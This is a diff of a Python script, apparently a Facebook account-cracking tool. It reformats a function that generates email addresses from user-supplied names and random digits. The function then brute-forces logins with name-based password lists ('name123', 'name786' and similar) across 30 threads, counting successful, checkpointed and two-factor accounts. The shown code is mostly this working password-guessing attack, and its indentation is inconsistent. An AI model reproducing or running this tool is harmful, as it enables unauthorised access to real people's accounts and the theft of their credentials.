@@ -638,78 +638,78 @@ def ffb(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 def gmail():
-                os.system('rm -rf .re.txt')
-                os.system('clear');print(logo);linex()
-                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
+        os.system('rm -rf .re.txt')
+        os.system('clear');print(logo);linex()
+        print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
+        linex()
+        first = input(' Put first name: ')
+        linex()
+        print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
+        linex()
+        last = input(' Put last name: ')
+        linex()
+        print(' Example: @gmail.com , @yahoo.com etc...')
+        linex()
+        domain = input(' domain: ')
+        linex()
+        try:
+                limit=int(input(' Put limit: '))
+        except ValueError:
+                limit = 5000
+        print(' Getting gmails...')
+        lists = ['3','4']
+        for xd in range(limit):
+                lchoice = random.choice(lists)
+                if '3' in lchoice:
+                        mail = ''.join(random.choice(string.digits) for _ in range(3))
+                        open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+               else:
+                        mail = ''.join(random.choice(string.digits) for _ in range(4))
+                        open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+        fo = open('.re.txt', 'r').read().splitlines()
+        print(' All method working try 1 by 1 ')
+        linex()
+        print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
+        linex()
+        mthd = input(' Choose method: ')
+        linex()
+        print(' Do you went show cp account? (y/n): ')
+        linex()
+        cx=input(' Choose: ')
+        if cx in ['y','Y','yes','Yes','1']:
+                pcp.append('y')
+        else:
+                pcp.append('n')
+        linex()
+        with tred(max_workers=30) as yaari:
+                tl = str(len(fo))
+                os.system('clear');print(logo)
+                print(' Total account : \033[1;32m'+tl)
+                print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                 linex()
-                first = input(' Put first name: ')
-                linex()
-                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
-                linex()
-                last = input(' Put last name: ')
-                linex()
-                print(' Example: @gmail.com , @yahoo.com etc...')
-                linex()
-                domain = input(' domain: ')
-                linex()
-                try:
-                        limit=int(input(' Put limit: '))
-                except ValueError:
-                        limit = 5000
-                print(' Getting gmails...')
-                lists = ['3','4']
-                for xd in range(limit):
-                        lchoice = random.choice(lists)
-                        if '3' in lchoice:
-                                mail = ''.join(random.choice(string.digits) for _ in range(3))
-                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                	for user in fo:
+                        ids,names = user.split('|')
+                        first_name = names.rsplit(' ')[0]
+                        try:
+                                last_name = names.rsplit(' ')[1]
+                        except IndexError:
+                                last_name = 'Khan'
+                        fs = first_name.lower()
+                        ls = last_name.lower()
+                        passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+			if mthd in ['1','01']:
+                                yaari.submit(m1,ids,passlist)
+                        elif mthd in ['2','02']:
+                                yaari.submit(m2,ids,passlist)
                         else:
-                                mail = ''.join(random.choice(string.digits) for _ in range(4))
-                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                        fo = open('.re.txt', 'r').read().splitlines()
-        	print(' All method working try 1 by 1 ')
-        	linex()
-        	print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
-        	linex()
-        	mthd = input(' Choose method: ')
-        	linex()
-        	print(' Do you went show cp account? (y/n): ')
-        	linex()
-        	cx=input(' Choose: ')
-        	if cx in ['y','Y','yes','Yes','1']:
-                	pcp.append('y')
-        	else:
-                	pcp.append('n')
-        	linex()
-                with tred(max_workers=30) as yaari:
-                        tl = str(len(fo))
-                        os.system('clear');print(logo)
-                        print(' Total account : \033[1;32m'+tl)
-                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
-                        linex()
-                        for user in fo:
-                                ids,names = user.split('|')
-                                first_name = names.rsplit(' ')[0]
-                                try:
-                                        last_name = names.rsplit(' ')[1]
-                                except IndexError:
-                                        last_name = 'Khan'
-                                fs = first_name.lower()
-                                ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-				if mthd in ['1','01']:
-                                        yaari.submit(m1,ids,passlist)
-                                elif mthd in ['2','02']:
-                                        yaari.submit(m2,ids,passlist)
-                                else:
-                                        yaari.submit(m3,ids,passlist)
-                print('\033[1;37m')
-                linex()
-                print(' The process has completed')
-                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
-                linex()
-                input(' Press enter to back ')
-                os.system('python azeem.py')
+                                yaari.submit(m3,ids,passlist)
+        print('\033[1;37m')
+        linex()
+        print(' The process has completed')
+        print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
+        linex()
+        input(' Press enter to back ')
+        os.system('python azeem.py')
 	
 def zee1():
 	os.system('clear')
